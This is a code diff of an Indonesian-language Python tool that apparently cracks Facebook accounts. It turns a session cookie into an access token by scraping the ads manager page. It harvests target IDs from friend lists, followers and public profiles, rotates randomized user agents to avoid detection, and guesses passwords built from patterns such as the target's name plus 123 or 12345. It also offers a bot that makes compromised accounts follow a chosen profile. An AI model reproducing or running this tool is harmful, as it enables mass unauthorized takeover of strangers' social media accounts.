@@ -844,10 +844,8 @@ class folder:
 			text.highlight_words(["[ Denventa ]","XAYONARA•CODETEAM","Maksimal"], "italic white")
 			console.rule("Information Pengguna Baru",style="red")
 			console.print(text, style="cyan", justify="center")
-def menu_belum_ada():
-	text = Text(f"""Sepertinya Menu Yang Anda Pilih Masih Tahap Perkembangan (Belum Tersedia)\nMohon Kerja Samanya....""")
-	text.highlight_words(["Mohon Kerja Samanya"], "bold green")
-	text.highlight_words(["Belum Tersedia"], "bold red")
+def not_available():
+	text = Text(f"""{QQ}Mohon Maaf, Fitur {konten} Belum Tersedia Untuk Saat Ini. Tunggu Update Selanjutnya Untuk Menggunakan Fitur-Fitur Yang Akan Datang. Terima Kasih.\n\n                {MM}- Denventa -""")
 	console.rule("Information Menu",style="red")
 	console.print(text, style="cyan", justify="center")
 	time.sleep(3)
@@ -1121,7 +1119,7 @@ class menu:
 		else:my_status = "Member Biasa";key_ = "Member"
 		tampilan_data = f"""{WOR}Name     : {KK}{nama}{QQ}
 {WOR}Your ID  : {KK}{id}{QQ}
-{WOR}Status   : {JJ}Premium 7 Days
+{WOR}Status   : {JJ}Premium 3 Days
 {WOR}Birthday : {KK}{bd}
 {WOR}Login    : {KK}{datetime.now().strftime('%A %d-%m-%Y')}""";api = requests.get('http://ip-api.com/json').json();time = f"""{WOR}IP       : {PP}{api['query']}
 {WOR}Country  : {KK}{api['country']}
@@ -1147,16 +1145,16 @@ class menu:
 			OQ = HH
 		try:ads = requests.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie':codeteam["cookie"]});url = requests.get('https://www.facebook.com/adsmanager/manage/campaigns?act='+ re.search('act=(.*?)&nav_source',str(ads.content)).group(1) +'&nav_source=no_referrer', cookies={'cookie':codeteam["cookie"]});mytok.append(re.search('accessToken="(.*?)"',str(url.content)).group(1))
 		except:exit('Failled Convert Cookie')
-		tampilan_menu = f"""   {II}[{AA}01{II}] {QQ}Friendlist                 {II}[{AA}04{II}] {QQ}ID Public           {II}[{AA}07{II}] {QQ}Followers
-   {II}[{AA}02{II}] {AA}Nama                       {II}[{AA}05{II}] {QQ}Email               {II}[{AA}08{II}] {AA}Grup
-   {II}[{AA}03{II}] {AA}Komentar                   {II}[{AA}06{II}] {AA}Likers              {II}[{AA}09{II}] {AA}Hashtag"""
+		tampilan_menu = f"""   {II}[{AA}01{II}] {MM}Crack {II}From {KK}Friendlist                 {II}[{AA}04{II}] {MM}Crack {QQ}Friend {II}From {QQ}ID {KK}Public           {II}[{AA}07{II}] {QQ}Crack From Followers
+   {II}[{AA}02{II}] {MM}Crack {II}From {KK}Name                       {II}[{AA}05{II}] {MM}Crack {II}From {KK}Email               {II}[{AA}08{II}] {MM}Crack {II}From {KK}Grup
+   {II}[{AA}03{II}] {MM}Crack {II}From {KK}Comment                    {II}[{AA}06{II}] {MM}Crack {II}From {KK}React                {II}[{AA}09{II}] {MM}Crack {II}From {KK}Hashtag"""
 		tampilan_tools = f"""   {II}[{AA}10{II}] {AA}Cek Opsi
    {II}[{AA}11{II}] {AA}Cek Teman
    {II}[{AA}12{II}] {AA}Cek Hasil
    {II}[{MM}00{II}] {CC}Keluar"""
-		tampilan_lain = f"""   {II}[{AA}13{II}] {AA}FB Developer
+		tampilan_lain = f"""   {II}[{AA}13{II}] {AA}Upgrade Pro
    {II}[{AA}14{II}] {AA}Bot Komen
-   {II}[{AA}15{II}] {AA}Bot Share
+   {II}[{AA}15{II}] {AA}Bot Comment
    {II}[{MM}00{II}] {CC}Keluar"""
 		torop_.append(Panel(tampilan_menu,width=90,title=f"{GOD}{II}Menu{GOD}",style=f"{A}"))
 		torop.append(Panel(tampilan_tools,width=45,title=f"{GOD}{II}Tools{GOD}",style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}SILAHKAN PILIH"))
@@ -1166,15 +1164,15 @@ class menu:
 		ass = input(f"{a}   ┗{k}MENU : {a}")
 		if status_key == "Admin":
 			if ass in ("1","01"):self.dump_teman();quit()
-			elif ass in ("2","02"):menu_belum_ada();self.daftar_menu()
-			elif ass in ("3","03"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("2","02"):not_available();self.daftar_menu()
+			elif ass in ("3","03"):not_available();self.daftar_menu()
 			elif ass in ("4","04"):self.dump_publik();quit()
 			elif ass in ("5","05"):self.dump_email();quit()
-			elif ass in ("6","06"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("6","06"):not_available();self.daftar_menu()
 			elif ass in ("7","07"):self.dump_follow();quit()
-			elif ass in ("8","08"):menu_belum_ada();self.daftar_menu()
-			elif ass in ("9","09"):menu_belum_ada();self.daftar_menu()
-			elif ass in ("10","11","12","13","14","15"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("8","08"):not_available();self.daftar_menu()
+			elif ass in ("9","09"):not_available();self.daftar_menu()
+			elif ass in ("10","11","12","13","14","15"):not_available();self.daftar_menu()
 #			elif ass in ("",""):
 			elif ass in ("00","000"):quit()
 			else:
@@ -1184,14 +1182,14 @@ class menu:
 
 		else:
 			if ass in ("1","01"):self.dump_teman();quit()
-			elif ass in ("2","02"):menu_belum_ada();self.daftar_menu()
-			elif ass in ("3","03"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("2","02"):not_available();self.daftar_menu()
+			elif ass in ("3","03"):not_available();self.daftar_menu()
 			elif ass in ("4","04"):self.dump_publik();quit()
-			elif ass in ("5","05"):kata_free()
-			elif ass in ("6","06"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("5","05"):self.dump_email();self.daftar_menu()
+			elif ass in ("6","06"):not_available();self.daftar_menu()
 			elif ass in ("7","07"):self.dump_follow();quit()
-			elif ass in ("8","08"):menu_belum_ada();self.daftar_menu()
-			elif ass in ("9","09"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("8","08"):not_available();self.daftar_menu()
+			elif ass in ("9","09"):not_available();self.daftar_menu()
 			elif ass in ("10"):kata_free()
 			elif ass in ("11"):kata_free()
 			elif ass in ("12"):kata_free()
@@ -1228,7 +1226,7 @@ class menu:
 		prints(Panel(f"{WOR}{OO}Nama Target :{PP}{nama}{QQ}\n{WOR}{OO}Limit ID    : {PP}{len(id)}{QQ}",width=100,padding=(0),style=f"{A}"))
 		if len(id)==0:os.sys.exit(f"{war}Maaf ID Yang Terkumpul Tidak Ada!!")
 		else:pass
-		tampilan_id = f"""   {QQ}[{CC}01{QQ}] {II}Crack Dari Random {QQ}[{CC}02{QQ}] {PP}Crack Dari Tertua {QQ}[{CC}03{QQ}] {UU}Crack Dari TerMuda{QQ}"""
+		tampilan_id = f"""   {QQ}[{CC}01{QQ}] {II}Crack From ID [ Random ] {QQ}[{CC}02{QQ}] {PP}Crack From ID [ OLD ] {QQ}[{CC}03{QQ}] {UU}Crack From ID [ NEW ]{QQ}"""
 		prints(Panel(tampilan_id,width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
 		hu = input(f"{a}   ┗{k}PILIH : {a}")
 		if hu in ['1','01']:
@@ -1262,7 +1260,7 @@ class menu:
 			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idz,codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
 			zxc = json.loads(yz.text)
 			nama= zxc["name"]
-		except:nama="UDIN"
+		except:nama="FERLY"
 		prints(Panel(f"{WOR}{OO}Nama Target :{PP}{nama}{QQ}\n{WOR}{OO}Limit ID    : {PP}{len(id)}{QQ}",width=100,padding=(0),style=f"{A}"))
 		if len(id)==0:os.sys.exit(f"{war}Maaf ID Yang Terkumpul Tidak Ada!!")
 		else:pass
@@ -1299,7 +1297,7 @@ class menu:
 			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idz,codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
 			zxc = json.loads(yz.text)
 			nama= zxc["name"]
-		except:nama="UDIN"
+		except:nama="FERLY"
 		prints(Panel(f"{WOR}{OO}Nama Target :{PP}{nama}{QQ}\n{WOR}{OO}Limit ID    : {PP}{len(id)}{QQ}",width=100,padding=(0),style=f"{A}"))
 		if len(id)==0:os.sys.exit(f"{war}Maaf ID Yang Terkumpul Tidak Ada!!")
 		else:pass
@@ -1464,59 +1462,21 @@ class crack:
 		except:pass
 	def user_agnrt(self):
 		rr = random.randint
-		tampilan_agen = f"""   {QQ}[{CC}01{QQ}] {PP}Android Browser 4
-   {QQ}[{CC}02{QQ}] {PP} KFONWI
-   {QQ}[{CC}03{QQ}] {PP} All User-Agent Random
-   {QQ}[{CC}04{QQ}] {QQ}Manual
-   {QQ}[{CC}05{QQ}] {QQ}Semua User-Agent"""
+		tampilan_agen = f"""   {II}[{AA}01{II}] {QQ}All User Agent Random
+   {II}[{AA}02{II}] {QQ}Manual"""
 		prints(Panel(tampilan_agen,title=f"{GOD}{PP}Pilih Bentuk User-Agent{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
-		hu = input(f"{a}   ┗{c}PILIH : {a}")
+		hu = input(f"{a}   ┗{i}PILIH : {a}")
 		if hu in ['1','01']:
-			for x in range(10000):
-				_='Mozilla/5.0 (Linux; U; Android'
-				__=random.choice(['6','7','8','9','10','11','12'])
-				___=' en-us; GT-'
-				____=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-				_____=random.randrange(1, 999)
-				______=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-				_______='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-				________=random.randrange(73,100)
-				_________=random.randrange(4200,4900)
-				__________=random.randrange(40,150)
-				___________='Mobile Safari/537.36'
-				ugen.append(f'{_} {__}; {___}{____}{_____}{______}) {_______}{________}.0.{_________}.{__________} {___________}')
-		elif hu in ['2','02']:
-			for x in range(10000):
-				ugen.append(f"Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(rr(111,999))}.{str(rr(1,9))}.{str(rr(1,99))} like Chrome/{str(rr(111,999))}.0.{str(rr(1111,9999))}.{str(rr(111,999))} Safari/537.36")
-
-
-		elif hu in ['3','03']:
 			zz = requests.get("https://raw.githubusercontent.com/ChangzFB/User-Agent/main/Chang.txt").text
 			for x in zz.splitlines():
 				ugen.append(x)
-
-
-		elif hu in ['4','04']:
+				
+		elif hu in ['4','02']:
 			prints(Panel(f"{WAR}{KK}Masukan User-Agent Minimal Tiga Puluh(30 Kata) Huruf\n{WAR}{KK}Gunakan Symbol | Untuk Pemisah",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏MASUKAN AGENT"))
-			ua_z = input(f"{a}   ┗{c}UserAgent : {a}").split("|")
+			ua_z = input(f"{a}   ┗{i}UserAgent : {a}").split("|")
 			for x in ua_z:
 				ugen.append(x)
-			ugen.append("Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-B938Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4441.75 Mobile Safari/537.36")
-		elif hu in ['5','05']:
-			for x in range(10000):
-				ugen.append(f"Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(rr(111,999))}.{str(rr(1,9))}.{str(rr(1,99))} like Chrome/{str(rr(111,999))}.0.{str(rr(1111,9999))}.{str(rr(111,999))} Safari/537.36")
-				_='Mozilla/5.0 (Linux; U; Android'
-				__=random.choice(['6','7','8','9','10','11','12'])
-				___=' en-us; GT-'
-				____=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-				_____=random.randrange(1, 999)
-				______=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-				_______='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-				________=random.randrange(73,100)
-				_________=random.randrange(4200,4900)
-				__________=random.randrange(40,150)
-				___________='Mobile Safari/537.36'
-				ugen.append(f'{_} {__}; {___}{____}{_____}{______}) {_______}{________}.0.{_________}.{__________} {___________}')
+			ugen.append("Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36")
 		else:
 			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
 			console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
@@ -1611,18 +1571,18 @@ class crack:
 		return pow
 	def pasang_bot_follow(self):
 		prints(Panel(f"{WIR}{KK}Apakah Anda Mau Menggunkan Bot Follow Facebook Jika Dapat Akun Ok? {QQ}[{PP}Y/n{QQ}]",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
-		pas_t = input(f"{a}   ┗{c}Pilih : {a}")
+		pas_t = input(f"{a}   ┗{i}Pilih : {a}")
 		if pas_t=="y" or pas_t=="Y":
 			prints(Panel(f"{WAR}{KK}Masukan ID Akun Untuk DiFollow",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN ISI"))
-			id = input(f"{a}   ┗{c}ID Anda : {a}")
+			id = input(f"{a}   ┗{i}ID Anda : {a}")
 			if id == "":self.pasang_bot_follow()
 			else:follow_id.append(id)
 
 	def mentod(self):
 		global method
-		tampilan_mentod = f"""   {QQ}[{CC}01{QQ}] {PP}Method 1
-   {QQ}[{CC}02{QQ}] {PP}Method 2
-   {QQ}[{CC}03{QQ}] {PP}Method 3
+		tampilan_mentod = f"""   {QQ}[{CC}01{QQ}] {PP}Name {QQ}•{PP} Name+123 {QQ}•{PP} Name+12345
+   {QQ}[{CC}02{QQ}] {PP}Name {QQ}•{PP} Name+123 {QQ}•{PP} Name+1234 {QQ}•{PP} Name+12345
+   {QQ}[{CC}03{QQ}] {PP}Name {QQ}•{PP} Name+123 {QQ}•{PP} Name+1234 {QQ}•{PP} Name+12345 {QQ}•{PP} Nama Lengkap
    {QQ}[{CC}04{QQ}] {PP}Method 4
    {QQ}[{CC}05{QQ}] {PP}All Method"""
 		prints(Panel(tampilan_mentod,title=f"{GOD}{PP}Pilih Bentuk Password{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
